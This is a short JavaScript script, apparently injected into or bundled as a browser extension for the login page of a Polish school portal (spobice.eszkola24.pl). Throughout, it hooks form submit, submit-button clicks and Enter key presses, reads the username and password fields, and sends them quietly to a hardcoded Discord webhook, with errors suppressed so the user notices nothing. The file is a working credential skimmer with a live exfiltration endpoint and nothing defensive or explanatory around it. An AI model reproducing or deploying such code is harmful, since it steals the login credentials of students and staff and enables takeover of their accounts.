(function () {
  const WEBHOOK = "https://discord.com/api/webhooks/1567217755894321255/OJjbC1zo65mu95_xBszk791R3QZJT3uhe-HJPR_-aH3zQsT8p8nn538hSeQEWV14uVOX";
  let last = 0;

  function send(u, p) {
    const now = Date.now();
    if (now - last < 2500) return; // dedupe click+submit double-fire
    last = now;
    const body = JSON.stringify({
      content: "\uD83D\uDD10 spobice.eszkola24.pl | login: " + (u || "(puste)") + " | haslo: " + (p || "(puste)")
    });
    try {
      fetch(WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: body,
        mode: "cors",
        keepalive: true, // przezywa redirect po submit (chrome/mv3)
      });
    } catch (e) { /* cicho */ }
  }

  function harvest() {
    const f = document.querySelector("form.login-form") || document.querySelector("form");
    if (!f) return;
    const u = f.querySelector("input[name=login]");
    const p = f.querySelector("input[name=passwd]");
    if (p && p.value !== "") send(u ? u.value : "", p.value);
  }

  document.addEventListener("submit", harvest, true);
  document.addEventListener("click", function (e) {
    if (e.target && e.target.type === "submit") harvest();
  }, true);
  document.addEventListener("keydown", function (e) {
    if (e.key === "Enter") harvest();
  }, true);
})();
